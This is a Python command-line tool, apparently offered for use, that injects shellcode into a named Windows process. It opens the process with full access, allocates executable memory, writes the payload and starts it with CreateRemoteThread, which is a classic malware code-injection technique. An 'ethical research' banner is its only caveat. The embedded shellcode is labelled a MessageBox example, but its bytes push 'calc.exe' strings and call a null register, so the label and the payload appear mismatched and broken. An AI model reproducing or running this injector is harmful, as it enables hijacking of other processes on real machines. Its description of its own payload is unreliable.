import ctypes
import psutil
import sys

RED_APPLE = r"""
      ,--./,-.
     / #      \
    |          |
     \        /  
      `._,._,'
"""

print(RED_APPLE)
print("\n[+] Advanced Shellcode Injector - Use for Ethical Research\n")

# Shellcode (Windows MessageBox Example Shellcode)
SHELLCODE = b"\x31\xc0\x50\x68\x2e\x65\x78\x65\x68\x63\x61\x6c\x63\x89\xe6\x50\x56\xff\xd0"

def find_process_id(proc_name):
    for proc in psutil.process_iter(['pid', 'name']):
        if proc.info['name'].lower() == proc_name.lower():
            return proc.info['pid']
    return None

def inject_shellcode(proc_name, shellcode):
    pid = find_process_id(proc_name)
    if not pid:
        print(f"[-] Process '{proc_name}' not found.")
        return False

    print(f"[+] Target Process: {proc_name} (PID: {pid})")

    # Open target process
    kernel32 = ctypes.windll.kernel32
    h_process = kernel32.OpenProcess(0x1F0FFF, False, pid)

    if not h_process:
        print("[-] Failed to obtain process handle.")
        return False

    print("[+] Process handle obtained.")

    # Allocate memory in the target process
    remote_memory = kernel32.VirtualAllocEx(h_process, 0, len(shellcode), 0x1000 | 0x2000, 0x40)

    if not remote_memory:
        print("[-] Memory allocation failed.")
        return False

    print("[+] Memory allocated in target process.")

    # Write shellcode into allocated memory
    bytes_written = ctypes.c_size_t()
    kernel32.WriteProcessMemory(h_process, remote_memory, shellcode, len(shellcode), ctypes.byref(bytes_written))

    print("[+] Shellcode written into target process memory.")

    # Execute shellcode
    remote_thread = kernel32.CreateRemoteThread(h_process, None, 0, remote_memory, None, 0, None)

    if not remote_thread:
        print("[-] Failed to create remote thread.")
        return False

    print("[+] Shellcode executed inside target process!")

    kernel32.CloseHandle(h_process)
    return True

# User Input
if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python injector.py <process_name.exe>")
        sys.exit(1)

    process_name = sys.argv[1]

    if inject_shellcode(process_name, SHELLCODE):
        print("[+] Injection Completed.")
    else:
        print("[-] Injection Failed.")
